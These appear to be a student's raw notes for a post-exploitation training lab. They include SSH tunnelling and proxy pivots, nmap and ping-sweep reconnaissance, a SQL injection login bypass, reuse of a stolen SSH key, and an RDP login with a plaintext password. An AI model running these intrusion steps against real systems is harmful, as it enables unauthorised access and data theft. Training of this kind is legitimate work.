Donovian Post Exploitation (DPE)
XX Mar 2024
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)

Objective: Maneuver through Donovian-Extranet, identify and gain access futher into Donovian internal Cyberspace, it is believed that there is an network that acts as an internal DMZ between these to locations. Intelligence was able to identify the last octet of a system that resides in the Donovian internal Cyberspace.

Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Network scanning tools/technique usage is at the discretion of student. Credential reuse is authorized

Scenario Credentials: FLAG = P05T3xpl01t5t@rtoF@ct1v1ty

Prior Approvals: Sudo usage and remote port forward is authorized. System dir walks from system roots, altering accounts/routing or tool uploads are authorized. Survey and access to newly discovered systems during C-ISR.

Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.100 (EXT NET)
-->T3:x.x.x.9
```shell
ssh student@10.50.39.150 -L 10300:192.168.28.100:2222
ssh student@10.50.39.150 -p 10300 -D 9050 -NT
ssh student@10.50.39.150 -L 10301:192.168.28.100:80

ssh student@10.50.39.150 -L 10300:192.168.28.100:2222
-------------------------------------------------------------
ssh www-data@localhost -p 10300 -D 9050 -NT
ssh student@10.50.39.150 -L 10301:192.168.28.100:80
-------------------------------------------------------------
Target Section:

T1
Hostname: Donovian_Extranet
IP: 192.168.28.100
80
OS: CentOS
Creds:Unknown
Last Known SSH Port: 2222
PSP: none
Malware: none
Action: Perform SSH masquerade and survey system. Identify redirection to the next target.

T2
Hostname: Donovian_Extranet
IP: 192.168.150.253
80
OS: CentOS
Creds:Unknown
Last Known SSH Port: 
PSP: none
Malware: none
Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
Not shown: 998 closed ports
PORT    STATE SERVICE
80/tcp  open  http
514/tcp open  shell
nmap -p 445 --script smb-os-discovery 192.168.28.5
nmap 192.168.150.253 -Pn -p 80 --script http-enum.nse
nmap 192.168.150.253 -Pn -p 80 --script http-robots.txt.nse
proxychains nmap 192.168.28.9 -Pn --script banner.nse -p 135,139,445,3389,5040,5985,5986,47001,49664,49665,49666,49667,49668,49670,49671,49672



T3
Hostname: unknown
IP: 192.168.28.9 internal
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Gain access; survey host and map Donovian internal Cyberspace.

for i in {1..254}; do (ping -c 1 192.168.$i.0 | grep "bytes from" &); done | awk '{print $4}' | cut -d: -f1 > ips7.txt
for i in {1..254}; do (ping -c 1 192.168.$i.9 | grep "bytes from" &); done | awk '{print $4}' | cut -d: -f1
192.168.28.9
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
5985/tcp  open  wsman
5986/tcp  open  wsmans
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown

scp -P 10300 www-data@localhost:/tmp/backup.tar.gz .
tar -xvzf backup.tar.gz

tar -xvzf backups.tar.gz -C /home/student/comrade

3201/tcp open  cpq-tasksmart
 
RAM' or 1='1

ssh -i /home/student/comrade/.ssh/id_rsa comrade@localhost -p 3201 -D 90

ssh student@10.50.39.150 -L 10300:192.168.28.100:2222
ssh www-data@localhost -p 10300 -L 10301:192.168.150.253:3201
ssh root@localhost -p 10301 -D 9050

-------------------------------------------------------------
ssh -i /home/student/comrade/.ssh/id_rsa comrade@localhost -p 10304 -L 10305:192.168.150.253:3201

ssh www-data@localhost -p 10300 -D 9050 -NT
ssh student@10.50.39.150 -L 10301:192.168.28.100:80


192.168.56.1   badguy  
rsyslog.d ---all
@@badguy:514
#f1ag = KIoM5oUabLaNdBfIrwzC


tcpdump -vv -x not port 3201

proxychains xfreerdp /v:192.168.28.9 /u:comrade
StudentMidwayPassword